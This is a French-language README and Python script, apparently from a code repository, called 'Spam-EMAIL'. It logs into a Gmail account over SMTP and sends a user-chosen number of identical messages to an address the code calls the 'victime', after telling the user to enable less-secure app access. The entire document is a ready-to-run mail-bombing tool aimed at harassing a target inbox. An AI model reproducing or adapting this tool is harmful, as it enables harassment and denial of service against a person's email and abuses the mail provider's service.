# Spam-EMAIL
Ce programme Python vous permet de spam une adresse mail(IL FAUT AUTORISEZ DES APPLICATIONS TIERS A ACCEDER A VOTRE COMPTE GMAIL)


from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import getpass
from getpass import getpass


autorisation=0

 
print("POUR POUVOIR UTILISER CETTE APPLICATION DE SPAM VOUS DEVEZ :autorisez des applications et des appareils utilisant une technologie de connexion moins sécurisée à accéder à votre compte")
autorisation=int(input("Avez  autorisez votre compte GMAIL a laissez des applications tierces l'utilisez. Utilisez 1 pour <<OUI>> et 2 pour <<NON>> :   "))

if autorisation==1 :

    print("vous pouvez utilisez SPAMM ACCOUNT")
    nombre_de_mail_envoyé = 0
    Estimation_du_temps = 0


    email = str(input("saisir votre adresse mail : "))
    adresse_mail_de_la_victime = str(input("saisir l'adresse mail de la victime : "))
    mdp = getpass("saisir votre  mot de passe : ")
    objet = str(input("saisir l'objet du mail : "))
    corps = str(input("saisir le corps du mail : "))
    nombre_de_message_a_envoyé = int(input("saisir le nombre de message a envoyé : "))
    Estimation_du_temps = (nombre_de_message_a_envoyé*1)/26

    if Estimation_du_temps>1:

        print("votre spam mail va durer  environ : ", round(Estimation_du_temps, 2), "minute(s)")
    else:
        print("votre spam mail va durer  environ : ", round(Estimation_du_temps,2)*60, "seconde(s)")


    for i in range(nombre_de_message_a_envoyé):
        msg = MIMEMultipart('alternative')
        msg['From'] = email
        msg['To'] = adresse_mail_de_la_victime
        password = mdp
        msg['Subjects'] = objet
        body = corps
        msg.attach(MIMEText(body, 'html'))
     

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit
        nombre_de_mail_envoyé = nombre_de_mail_envoyé+1
        print(nombre_de_mail_envoyé)       
    print("Message envoyé avec succès")

else:
    print("Vous ne pouvez pas utilisez SPAMM ACCOUNT")


print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("-----------------------------------------------------------")
print("          APPLICATION FAITES PAR DOPEKILL                  ")
